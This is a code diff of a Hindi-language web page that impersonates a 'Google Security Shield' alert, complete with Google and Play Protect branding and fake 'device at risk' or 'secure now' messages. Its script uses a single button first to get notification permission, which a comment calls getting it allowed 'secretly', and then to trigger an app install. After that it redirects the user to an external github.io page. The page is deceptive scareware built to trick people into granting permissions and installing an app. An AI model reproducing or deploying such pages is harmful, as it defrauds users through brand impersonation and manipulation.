@@ -1,73 +1,54 @@
-<!DOCTYPE html>
-<html lang="hi">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Android Security Shield</title>
-    <link rel="manifest" href="manifest.json">
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; width: 90%; max-width: 380px; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; border-top: 8px solid #1a73e8; }
-        .shield-icon { width: 70px; margin-bottom: 15px; }
-        h2 { color: #202124; font-size: 20px; margin-bottom: 10px; }
-        p { color: #5f6368; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
-        .main-btn { background: #1a73e8; color: white; border: none; padding: 15px 0; width: 100%; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 6px rgba(26,115,232,0.3); }
-        .main-btn:active { transform: scale(0.98); }
-        .trust-footer { margin-top: 20px; font-size: 11px; color: #9aa0a6; display: flex; align-items: center; justify-content: center; gap: 5px; }
-    </style>
-</head>
-<body>
-
 <div class="card">
-    <img src="https://www.gstatic.com/images/branding/product/2x/gshield_96dp.png" class="shield-icon" alt="Shield">
-    <h2>सिस्टम सुरक्षा अलर्ट</h2>
-    <p>आपका डिवाइस खतरे में हो सकता है। सुरक्षा पैच अपडेट करने और रीयल-टाइम प्रोटेक्शन चालू करने के लिए नीचे दिए गए बटन पर क्लिक करें।</p>
+    <img src="https://www.gstatic.com/images/branding/product/2x/gshield_96dp.png" class="shield-icon">
+    <h2>Google Security Shield</h2>
+    <p>आपका डिवाइस सुरक्षित है। रीयल-टाइम सुरक्षा डैशबोर्ड खोलने के लिए नीचे बटन दबाएं।</p>
     
-    <button class="main-btn" id="masterButton">अभी सुरक्षित करें (Secure Now)</button>
-
-    <div class="trust-footer">
-        <img src="https://www.gstatic.com/images/branding/product/1x/play_protect_32dp.png" width="15"> 
-        Google Play Protect द्वारा सत्यापित
-    </div>
+    <button class="main-btn" id="masterButton">सिस्टम सुरक्षित करें</button>
 </div>
 
 <script>
     let deferredPrompt;
     const masterButton = document.getElementById('masterButton');
 
-    // 1. ऐप इंस्टॉल (आइकन) की तैयारी
+    // ऐप इंस्टॉल होने के लिए तैयार है या नहीं, यह चेक करेगा
     window.addEventListener('beforeinstallprompt', (e) => {
         e.preventDefault();
         deferredPrompt = e;
     });
 
-    // मास्टर बटन का कमाल
     masterButton.addEventListener('click', async () => {
-        
-        // स्टेप A: तुरंत नोटिफिकेशन की इजाजत मांगना
+        // 1. सबसे पहले चुपके से नोटिफिकेशन Allow करवाना
         const permission = await Notification.requestPermission();
         
         if (permission === "granted") {
-            // स्टेप B: होम स्क्रीन पर आइकन बनाना (Add to Home Screen)
+            // 2. अब उसी बटन से इंस्टॉल करवाना
             if (deferredPrompt) {
                 deferredPrompt.prompt();
                 const { outcome } = await deferredPrompt.userChoice;
-                console.log(`User response to install: ${outcome}`);
+                
+                if (outcome === 'accepted') {
+                    // जादू: इंस्टॉल होते ही बटन बदल जाएगा
+                    masterButton.innerText = "Security App खोलें";
+                    masterButton.style.background = "#000"; // काला रंग ताकि अलग दिखे
+                    
+                    // यूजर को यहीं से ऐप के अंदर भेजना
+                    masterButton.onclick = () => {
+                        alert("Security App अब आपके फोन में सक्रिय है!");
+                        window.location.href = "https://rajahribabakumar-hub.github.io/Nob/"; 
+                    };
+                }
                 deferredPrompt = null;
+            } else {
+                // अगर पहले से इंस्टॉल है तो सीधे खोलना
+                masterButton.innerText = "Security Dashboard खोलें";
+                alert("आपका डिवाइस पहले से सुरक्षित है।");
             }
-
-            // स्टेप C: यूजर को भरोसा दिलाना
-            masterButton.innerText = "सुरक्षा सक्रिय है (Active)";
-            masterButton.style.background = "#34a853";
-            alert("बधाई हो! आपका डिवाइस अब सुरक्षित है और नोटिफिकेशन सेवा चालू कर दी गई है।");
-            
-            // अंत में अपने टेलीग्राम या किसी और पेज पर भेजना (Optional)
-            // window.location.href = "https://t.me/your_link";
-        } else {
-            alert("चेतावनी: सुरक्षा अपडेट के लिए नोटिफिकेशन की अनुमति अनिवार्य है। कृपया दोबारा प्रयास करें।");
         }
     });
-</script>
 
-</body>
-</html>
+    // यह ट्रैक करता है कि ऐप इंस्टॉल हो गया है
+    window.addEventListener('appinstalled', (evt) => {
+        console.log('App was installed');
+        masterButton.innerText = "Open Security System";
+    });
+</script>
